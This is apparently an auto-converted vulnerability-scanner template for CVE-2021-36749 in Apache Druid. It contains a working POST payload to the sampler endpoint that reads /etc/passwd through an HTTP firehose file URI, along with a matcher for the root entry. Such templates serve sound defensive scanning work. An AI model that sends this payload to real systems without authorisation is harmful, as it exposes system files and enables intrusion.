id: yaml-poc-apache-druid-other-CVE-2021-36749
info:
  name: Yaml Poc Apache Druid Other Cve 2021 36749
  author: converted
  severity: medium
  description: 'Converted from xpoc: yaml-poc-apache-druid-other-CVE-2021-36749'
  tags: apache,cve
  classification:
    cve-id: CVE-2021-36749
  reference:
  - https://lists.apache.org/thread.html/r304dfe56a5dfe1b2d9166b24d2c74ad1c6730338b20aef77a00ed2be%40%3Cannounce.apache.org%3E
  - https://lists.apache.org/thread.html/r304dfe56a5dfe1b2d9166b24d2c74ad1c6730338b20aef77a00ed2be@%3Cannounce.apache.org%3E
  - https://lists.apache.org/thread.html/rc9400a70d0ec5cdb8a3486fc5ddb0b5282961c0b63e764abfbcb9f5d%40%3Cdev.druid.apache.org%3E
  - https://nvd.nist.gov/vuln/detail/CVE-2021-36749
http:
- method: POST
  path:
  - /druid/indexer/v1/sampler?for=connect
  body: '{"type": "index", "spec": {"type": "index", "ioConfig": {"type": "index",
    "firehose": {"type": "http", "uris": ["file:///etc/passwd"]}}, "dataSchema": {"dataSource":
    "sample", "parser": {"type": "string", "parseSpec": {"format": "regex", "pattern":
    "(.*)", "columns": ["a"], "dimensionsSpec": {}, "timestampSpec": {"column": "!!!_no_such_column_!!!",
    "missingValue": "2010-01-01T00:00:00Z"}}}}}, "samplerConfig": {"numRows": 500,
    "timeoutMs": 15000}}

    '
  headers:
    Content-Type: application/json
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: regex
    part: body
    regex:
    - 'root:[x*]:0:0:'
